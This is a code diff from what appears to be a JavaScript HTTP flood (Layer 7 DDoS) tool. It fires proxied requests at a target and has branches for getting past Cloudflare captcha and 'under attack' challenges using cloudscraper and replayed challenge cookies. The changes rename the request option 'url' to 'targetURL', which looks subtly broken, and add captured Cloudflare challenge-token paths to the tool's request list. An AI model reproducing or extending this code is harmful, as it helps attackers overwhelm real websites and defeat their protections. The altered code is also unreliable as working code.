@@ -30,7 +30,7 @@ var privacyPassSupport = true;
         var cookie = "";
         if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
             request.get({
-                url: l7.target + "?_asds=" + num,
+                targetURL: l7.target + "?_asds=" + num,
                 gzip: true,
                 proxy: proxies,
                 headers: {
@@ -60,7 +60,7 @@ var privacyPassSupport = true;
                 cookie = res.headers['set-cookie'].shift().split(';').shift();
                 if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                     cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
+                        targetURL: l7.target + "?_asds=" + num,
                         gzip: true,
                         proxy: proxies,
                         headers: {
@@ -79,7 +79,7 @@ var privacyPassSupport = true;
                         if (res.headers['set-cookie']) {
                             cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                             cloudscraper.get({
-                                url: l7.target + "?_asds=" + num,
+                                targetURL: l7.target + "?_asds=" + num,
                                 proxy: proxies,
                                 headers: {
                                     'Connection': 'Keep-Alive',
@@ -124,7 +124,7 @@ var privacyPassSupport = true;
                     });
                 } else {
                     cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
+                        targetURL: l7.target + "?_asds=" + num,
                         proxy: proxies,
                         headers: {
                             'Connection': 'Keep-Alive',
@@ -148,7 +148,7 @@ var privacyPassSupport = true;
             });
         } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
             cloudscraper.get({
-                url: l7.target + "?_asds=" + num,
+                targetURL: l7.target + "?_asds=" + num,
                 proxy: proxies,
                 headers: {
                     'Upgrade-Insecure-Requests': 1,
@@ -173,7 +173,7 @@ var privacyPassSupport = true;
             });
         } else {
             cloudscraper.get({
-                url: l7.target + "?_asds=" + num,
+                targetURL: l7.target + "?_asds=" + num,
                 gzip: true,
                 proxy: proxies,
                 headers: {
@@ -487,6 +487,8 @@ const pathts = [
                 "#cfturnstile-js",
                 "#cfturnstile-woo-js-js",
                 "cf.turnstile.u",
+                "?__cf_chl_rt_tk=ml_F.Co.bSm2ThtHo_0.yG_yBCHur0PEIvcXfWA8KPQ-1745639993-1.0.1.1-3rJEZDkXq5ToyqnHW5DgQpvKR85IHURTsEkfC.ScFdk",
+                "?_asds=&__cf_chl_rt_tk=ml_F.Co.bSm2ThtHo_0.yG_yBCHur0PEIvcXfWA8KPQ-1745639993-1.0.1.1-3rJEZDkXq5ToyqnHW5DgQpvKR85IHURTsEkfC.ScFdk",
                 "?__cf_chl_rt_tk=RYX8ur1ZRxF_1d0vBYpv.FTWWK2LzW2YM.a0dxrzK1c-1745637475-1.0.1.1-YhgG_lj16ctWkDEFc7Y24Hm4ad0ldl2UaQdjEjlzBX0",
                 "?__cf_chl_rt_tk=54c5yBAqZo5xmOYn.2o9pSB4VqbuK0YlUNfoZBVxnWo-1745562753-1.0.1.1-HTK_pI5Ts0L0gTVtS2AcFfL_nsAaOR0wdQViZRmlrWw",
                 "?__cf_chl_rt_tk=G8V8x7kQgXv1buL5s1.g6b4eEZHmCHn9SsJVtPhw0rk-1745562464-1.0.1.1-eCE5c2AgE6io50aT_st2KGobWNSZ_vSdJfUJ4e0HAuM",
